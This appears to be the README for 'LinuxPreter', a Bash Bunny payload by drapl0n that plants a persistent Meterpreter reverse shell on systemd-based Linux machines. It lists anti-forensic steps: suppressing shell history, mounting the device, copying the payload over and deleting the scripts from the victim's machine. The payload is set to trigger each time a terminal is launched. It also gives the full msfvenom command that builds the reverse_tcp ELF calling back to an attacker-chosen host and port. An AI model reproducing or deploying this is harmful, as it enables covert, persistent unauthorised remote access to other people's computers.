## About:
* Title: LinuxPreter
* Description: Injects meterpreter payload and makes it persistent.
* AUTHOR: drapl0n
* Version: 1.0
* Category: Remote Access
* Target: Unix-like operating systems with systemd.
* Attackmodes: HID, Storage

## LinuxPreter injects meterpreter payload, make it persistent and triggers payload on launch of terminal/shell.

### Workflow:
* Keeping tracks clear by preventing storage of history.
* Fetching BashBunny's block device and mounting it.
* Transfering payload script and payload itself. 
* Deleting scripts from victims machine and unmounting bunny. 

### Create Meterpreter payload:
* ```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP ADDRESS> LPORT=<PORT NO> -f elf -o sysHandle.bin```
* NOTE: Only change IP address and Port number in the above command.

### LED Status:
* `SETUP`   : MAGENTA
* `ATTACK`  : YELLOW
* `FINISH`  : GREEN

### Directory Structure of payload components:
| FileName       | Directory                     |
| -------------- | ----------------------------- |
| payload.txt    | /payload/switch1/             |
| payload.sh     | /payload/                     |
| sysHandle.bin  | /tools/                       |


#### Support me if you like my work:
* https://twitter.com/drapl0n  
